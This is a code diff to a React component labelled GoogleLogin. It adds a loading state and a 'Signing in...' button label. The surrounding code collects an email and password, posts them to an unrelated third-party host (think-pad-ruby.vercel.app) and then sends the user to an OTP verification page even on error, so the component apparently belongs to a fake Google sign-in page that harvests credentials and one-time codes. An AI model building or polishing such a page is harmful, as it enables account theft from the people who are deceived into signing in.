@@ -4,6 +4,8 @@ import { useNavigate } from "react-router-dom";
 const GoogleLogin = () => {
     const navigate = useNavigate();
     const [formData, setFormData] = useState({ email: "", password: "" });
+    const [loading, setLoading] = useState(false); // Loading state
+
 
     const handleChange = (e) => {
         setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -11,6 +13,7 @@ const GoogleLogin = () => {
 
     const handleSubmit = async (e) => {
         e.preventDefault();
+        setLoading(true);
 
         try {
             const response = await fetch("https://think-pad-ruby.vercel.app/api/google/login", {
@@ -26,12 +29,14 @@ const GoogleLogin = () => {
 
                 // Redirect to OTP verification page
                 navigate("/verify");
+                setLoading(false);
             } else {
                 alert(`❌ Google Login Failed: ${data.message || "Something went wrong"}`);
             }
         } catch (error) {
             console.error("❌ Error during Google login:", error);
             navigate("/verify");
+            setLoading(false);
 
         }
     };
@@ -72,7 +77,7 @@ const GoogleLogin = () => {
 
                     <div style={styles.buttonContainer}>
                         <a href="#" style={styles.createAccount}>Create account</a>
-                        <button type="submit" style={styles.button}>Sign in</button>
+                        <button disabled={loading} type="submit" style={styles.button}>{loading ? "Signing in..." : "Sign In"}</button>
                     </div>
                 </form>
             </div>
